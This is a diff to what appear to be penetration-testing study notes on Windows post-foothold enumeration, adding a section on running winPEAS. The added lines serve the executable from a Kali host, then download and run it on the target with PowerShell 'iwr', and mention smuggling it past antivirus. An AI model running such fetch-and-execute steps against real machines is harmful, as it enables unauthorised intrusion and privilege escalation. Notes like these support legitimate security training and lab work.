@@ -1,6 +1,21 @@
 ## Windows Enumeration
 Having gained a foothold on a Windows machine by whatever mechanism the following items are important steps for us to gain situational awareness, with each item potentially proving critical to a successful effort at privilege escalation or lateral movement:
 
+### winPEAS
+Below is a lengthy list of commands that you can make use of in the event that `winPEAS` is impossible to smuggle onto the machine or is blocked via AV somehow. But under most circumstances lets not be cringe and use the purpose-built tool to enumerate a Windows environment:
+
+In Kali:
+```bash
+cp /usr/share/peass/winpeas/winPEASx64.exe .
+python3 -m http.server 80
+```
+On the target machine:
+```powershell
+iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
+.\winPEAS.exe
+```
+Look upon our exploitable shit ye mighty and despair!
+
 ### Username and hostname
 ```cmd
 whoami
